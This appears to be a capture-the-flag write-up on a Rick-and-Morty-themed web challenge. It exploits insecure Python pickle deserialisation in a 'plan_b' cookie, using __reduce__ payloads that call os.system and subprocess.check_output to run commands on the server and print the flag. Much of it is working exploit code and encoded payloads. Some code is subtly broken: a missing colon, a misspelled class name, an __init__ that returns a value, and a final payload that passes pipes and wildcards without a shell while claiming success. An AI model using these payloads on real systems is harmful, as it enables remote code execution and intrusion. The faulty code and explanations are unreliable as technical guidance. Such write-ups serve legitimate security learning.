Preface:
Navigating to the site we are greeted with a CSS animation of Rick from Rick and Morty (see above) along with a message underneath reading;  

`Don't play around with this serum morty!! <__main__.anti_pickle_serum object at 0x7efdf434d510>
on website`   

The site serves no further functionality, the source code is mostly uninteresting to us and simply houses the CSS elements.  
Importantly, the `<title>` of the webpage is "insecure deserialisation" while referencing pickles. This is a hint to the python pickle library which will be the focus of the challenge.
  
# Identifying Cookie
  
In our browser using developer tools we find a cookie named `plan_b` with a Base64 encoded value:  
`KGRwMApTJ3NlcnVtJ...`  
Decoding this string leaves us with unusuable data, it is clear we cannot modify the data in this form however does indeed look to be a python pickle.

echo "KGRwMApTJ3NlcnVtJwpwMQpjY29weV9yZWcKX3JlY29uc3RydWN0b3IKcDIKKGNfX21haW5fXwphbnRpX3BpY2tsZV9zZXJ1bQpwMwpjX19idWlsdGluX18Kb2JqZWN0CnA0Ck50cDUKUnA2CnMu" | base64 -d

# Disassembling Pickle

In order to properly interpret the data, we can utilise pickletools to dump the data and understand what parameters it contains.  
We first send the decoded cookie to a file in which pickletools can read, before using pickletools to disassemble and dump the data.

{{< highlight bash >}}
echo $encodedPickle | base64 -d > decodedPickle
python3 -m pickletools decodedPickle
  
    0: (    MARK                      
    1: d        DICT       (MARK at 0) Build a dict out of the topmost stack slice, after markobject.
    2: p    PUT        0               
    5: S    STRING     'serum'         Push a Python string object.
   14: p    PUT        1               
   17: c    GLOBAL     'copy_reg _reconstructor' 
   42: p    PUT        2                         
   45: (    MARK                                 
   46: c        GLOBAL     '__main__ anti_pickle_serum' Push a global object (module.attr) on the stack.
   74: p        PUT        3                            
   77: c        GLOBAL     '__builtin__ object'         
   97: p        PUT        4                            
  100: N        NONE                                    
  101: t        TUPLE      (MARK at 45)                 Build a tuple out of the topmost stack slice, after markobject.
  102: p    PUT        5                                
  105: R    REDUCE                                      
  106: p    PUT        6                                
  109: s    SETITEM                                     Add a key+value pair to an existing dict.
  110: .    STOP                                        
highest protocol among opcodes = bl0  
{{< /highlight >}}

It is important to note lines 1, 5, 46, 101, 109 and the note at the bottom as this will be important to how we reconstruct our modified pickle.    

We interpret the annotations as follows:    
Ln 1: Build a dictionary  
Ln 5: Set a string 'serum'  
Ln 46: Create an 'anti_pickle_serum' object  
Ln 101: Build a Tuple  
Ln 109: Assign the string 'serum' to a key and 'anti_pickle_serum' object as the value  
highest protocol among opcodes = 0: OPcode to use for the pickle

With this information we have a few requirements to forge a new pickle:
1. Create an obect
2. Create a dictionary with a key:value of "serum":[object]
3. Object Must be a Tuple
4. Use OPcode 0

# Crafting a New Pickle
We can use a python script to create our new pickle, we need to ensure we fulfill all our requirements for the pickle to be valid to be accepted as the original.

{{< highlight python >}}
import pickle, base64

class anti_pickle_serum(object):
    def __init__(self)
        morty = 'aw geez'
        return morty

pickled = pickle.dumps({'serum': ani_pickle_serum()}, protocol=0)
print(base64.urlsafe_b64encode(pickled))  
{{< /highlight >}}

This should return is with a base64'd pickle that fits our requirements. We create a class object with the string 'serum' paired with the value of in this case morty as a dictionary, dump the data with protocol 0 and recieve our base 64 string. Replacing the current cookie with this newly crafted one will have no effect, we need to turn this cookie into an exploit.

# Remode Code Execution

To turn said pickle into an exploit we can refer to an article by David Hamann, this goes much more in depth on how you can inject abritrary code into python pickles, the insecurity of the library is even mentioned on the official documentation.

```
Warning The pickle module is not secure. Only unpickle data you trust.
It is possible to construct malicious pickle data which will execute arbitrary code during unpickling. Never unpickle data that could have come from an untrusted source, or that could have been tampered with.
Reference: https://docs.python.org/3/library/pickle.html
```

From David's article, this is the important bit:

"So by implementing __reduce__ in a class which instances we are going to pickle, we can give the pickling process a callable plus some arguments to run. While intended for reconstructing objects, we can abuse this for getting our own reverse shell code executed."
Reference: <a href="https://davidhamann.de/2020/04/05/exploiting-python-pickle/">David's Article</a>

The article notes that the essential part of executing code through with pickles is by including the `__reduce__` function. We can use the PoC template from the article and incoporate our requirements we defined in our original script.

{{< highlight python >}}
import pickle, base64, os

class RCE(object):
    def __reduce__(self):
        cmd = ('id')
        return os.system, (cmd,)

if __name__ == '__main__':
    pickled = pickle.dumps({'serum': RCE()}, protocol=0)
    print(base64.urlsafe_b64encode(pickled))  
{{< /highlight >}}

The script creates an object from the RCE class, inside this class we have the __reduce__ function which returns a command through pythons os library, we use the pickle library to dump this data into a pickle, (note that we must use protocol 0) before encoding the pickle back to base64.

As an example, this is the output from running the `id` command:
{{< highlight bash >}} 
python exploit.py     # feel free to dissasemble and compare the data!
KGRwMApWc2VydW0KcDEKY3Bvc2l4CnN5c3RlbQpwMgooVmlkCnAzCnRwNApScDUKcy4=  
{{< /highlight >}}

Modfiying our cookie to the value of our python output, we observe the webpage message changes to "Don't play around with this serum morty!! 0". This indicates that our command execution was succesful, the "0" returned is the exit code of os.system(), (0 = Success).

This is possible due to insecure deserialization on the webserver, the server is deserializing our python pickle which as mentioned has modified data to execute  arbitrary code.

NOTE:  
In order to execute commands which are more than a singular string, we must pass the command as a list to our cmd variable, this is due to our pickle needing to be build from tuples. E.g the command `echo "pwned" > hacked.txt` becomes ['echo', '\"pwned\"', '>', 'hacked.txt'].

# Reflecting SDOUT

In order to locate and recieve the flag, we reflect the commands SDOUT (standard output) to the webpage, this proved difficult with a simple sollution.
My first attempts were redirecting the output to a file we could view via the webserver, 'ls > /static/out.txt'
This resulted in the exit code 256, meaning that the command could not be found on the server, this occured whenever using the operator '>' which may indicate bash is not present on the docker instance.
In some cases I recieved the error code 32512 which google indicates to be perl script related.

As a workaround I used pythons subprocess library with the .check_output function, this allowed the commands output to be reflected onto the webpage.

Our final exploit and payload is as follows:

{{< highlight python >}} 
import pickle, base64, subprocess

class RCE(object):
    def __reduce__(self):
        return subprocess.check_output, (['cat', '*', '|', 'grep', '\"HTB{*\"'],)
	
if __name__ == '__main__':
    pickled = pickle.dumps({'serum': RCE()}, protocol=0)
    print(base64.urlsafe_b64encode(pickled))
{{< /highlight >}}

Payload:
{{< highlight bash >}} 
python exploit.py
KGRwMApTJ3NlcnVtJwpwMQpjc3VicHJvY2VzcwpjaGVja19vdXRwdXQKcDIKKChscDMKUydjYXQnCnA0CmFTJyonCnA1CmFTJ3wnCnA2CmFTJ2dyZXAnCnA3CmFTJyJIVEJ7IicKcDgKYXRwOQpScDEwCnMu
{{< /highlight >}}

Modifying the cookie and refreshing the page, the flag is concatenated onto the original message:   

`Don't play around with this serum morty!! HTB{********************}`
